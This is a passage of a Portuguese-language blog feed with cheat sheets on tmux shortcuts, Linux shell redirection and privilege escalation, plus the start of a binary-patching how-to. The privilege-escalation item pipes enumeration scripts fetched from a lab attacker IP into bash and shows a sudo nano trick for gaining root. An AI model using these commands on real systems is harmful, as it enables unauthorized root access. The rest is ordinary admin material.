+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &amp;lt;SpaceBar&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ir para o próximo painel&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + o
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Mostrar números dos painéis (digite o número para ir para aquele painel)&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + q
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="alternar-zoom-do-painel">Alternar zoom do painel&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + z
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="converter-um-painel-em-janela">Converter um painel em janela&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + !
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="redimensionar-o-painel">Redimensionar o painel&lt;/h3>
+&lt;ul>
+&lt;li>Redimensionar altura do painel atual&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + Up
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ctrl + b + Down
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Redimensionar largura do painel atual&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + Left
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ctrl + b + Right
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="fechar-o-painel">Fechar o painel&lt;/h3>
+&lt;ul>
+&lt;li>Fechar o painel atual&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + x
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="entrar-no-modo-de-cópia-buffer">Entrar no modo de cópia (buffer)&lt;/h2>
+&lt;ul>
+&lt;li>Entrar no modo de cópia&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + &lt;span style="color:#f92672">[&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Entrar no modo de cópia e subir uma página&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl + b + PgUp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Sair do modo&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>q
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ir para a primeira linha&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>g
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Ir para a última linha&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>G
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="rolagem-usando-o-cursor-do-teclado-setas">Rolagem usando o cursor do teclado (setas)&lt;/h3>
+&lt;ul>
+&lt;li>Subir&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Keyboard Up Cursor // Up
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Descer&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Keyboard Down Cursor // Down
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Esquerda&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Keyboard Left Cursor // Left
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Direita&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Keyboard Right Cursor // Right
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="rolagem-usando-as-teclas-do-vim">Rolagem usando as teclas do &lt;code>vim&lt;/code>&lt;/h3>
+&lt;p>&lt;strong>PRIMEIRO: lembre de habilitar as teclas do &lt;code>vim&lt;/code> no modo de buffer&lt;/strong>. Vá para a seção &lt;a href="https://psylinux.github.io/pt/cheatsheet/cheatsheet_tmux/#set-the-runtime-tmux-options">Set the runtime tmux Options&lt;/a> para aprender mais.&lt;/p></description></item><item><title>Cheat Sheet :: Escalação de privilégios</title><link>https://psylinux.github.io/pt/cheatsheet/cheatsheet_privilege_escalation/</link><pubDate>Tue, 16 Jun 2020 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/cheatsheet/cheatsheet_privilege_escalation/</guid><description>&lt;h2 id="usando-scripts-para-enumerar-a-máquina">Usando scripts para enumerar a máquina&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/rebootuser/LinEnum&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Na máquina alvo podemos fazer:&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl 10.10.14.2/linpeas.sh | bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl 10.10.14.2/LinEnum.sh | bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="escalação-de-privilégio-com-nano">Escalação de privilégio com Nano&lt;/h2>
+&lt;ul>
+&lt;li>Isso pode ser usado para obter acesso root no servidor.&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo -u root /bin/nano /opt/priv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>O Nano permite inserir arquivos externos no arquivo atual usando o atalho.&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Ctrl+R
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>/pics/nano-001.png&lt;/p></description></item><item><title>Cheat Sheet :: Truques de Shell Linux</title><link>https://psylinux.github.io/pt/cheatsheet/cheatsheet_linux_shell_tricks/</link><pubDate>Tue, 16 Jun 2020 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/cheatsheet/cheatsheet_linux_shell_tricks/</guid><description>&lt;h2 id="para-encontrar-o-código-hex-correspondente">Para encontrar o código hex correspondente&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>echo -n &lt;span style="color:#e6db74">&amp;#34;&amp;amp;&amp;#34;&lt;/span> | hexdump -C
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="como-redirecionar-stderr-no-bash">Como redirecionar stderr no bash&lt;/h2>
+&lt;p>&lt;a href="https://www.cyberciti.biz/faq/how-to-redirect-standard-error-in-bash/">Artigo da nixCraft&lt;/a>&lt;/p>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: left">Comando&lt;/th>
+ &lt;th style="text-align: left">Descrição/Propósito&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: left">command 2&amp;gt;filename&lt;/td>
+ &lt;td style="text-align: left">Redireciona stderr para filename&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">command &amp;gt;output 2&amp;gt;filename&lt;/td>
+ &lt;td style="text-align: left">Redireciona stderr para o arquivo filename e stdout para o arquivo output&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">command &amp;amp;&amp;gt; filename&lt;/td>
+ &lt;td style="text-align: left">Redireciona stderr e stdout para filename&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">command 2&amp;gt;&amp;amp;-&lt;/td>
+ &lt;td style="text-align: left">Apenas suprime mensagens de erro. Nenhum arquivo criado. Nenhuma mensagem exibida na tela&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">command 2&amp;gt;/dev/null&lt;/td>
+ &lt;td style="text-align: left">Apenas suprime mensagens de erro.&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">command 2&amp;gt;&amp;amp;1&lt;/td>
+ &lt;td style="text-align: left">Redireciona mensagens de erro para a saída padrão. Útil em scripts quando você precisa exibir erros na tela&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="removendo-espaços-em-branco-e-caracteres-especiais">Removendo espaços em branco e caracteres especiais&lt;/h2>
+&lt;p>&lt;strong>Note que não podemos apenas digitar o acento ^; em vez disso devemos usar CTRL+V e depois CTRL+M.&lt;/strong>&lt;/p></description></item><item><title>HowTo :: Patch em binários no Linux</title><link>https://psylinux.github.io/pt/howto/howto_patching_binaries_in_linux/</link><pubDate>Mon, 14 Jan 2019 17:38:15 -0300</pubDate><guid>https://psylinux.github.io/pt/howto/howto_patching_binaries_in_linux/</guid><description>&lt;h2 id="introdução">Introdução&lt;/h2>
+&lt;p>Aprenda a aplicar patches em arquivos binários diretamente sem código-fonte usando edição hexadecimal e ferramentas de diff binário; essencial para corrigir bugs, aplicar patches de segurança ou modificar executáveis.&lt;/p>
+&lt;h2 id="o-que-é-patching-de-binários">O Que é Patching de Binários?&lt;/h2>
+&lt;p>Patching de binários é o processo de modificar arquivos executáveis compilados sem acesso ao seu código-fonte. Esta técnica é útil para:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Corrigir bugs&lt;/strong> em binários de produção quando recompilação não é possível&lt;/li>
+&lt;li>&lt;strong>Aplicar patches de segurança&lt;/strong> em sistemas legados&lt;/li>
+&lt;li>&lt;strong>Engenharia reversa&lt;/strong> e compreensão de como programas funcionam&lt;/li>
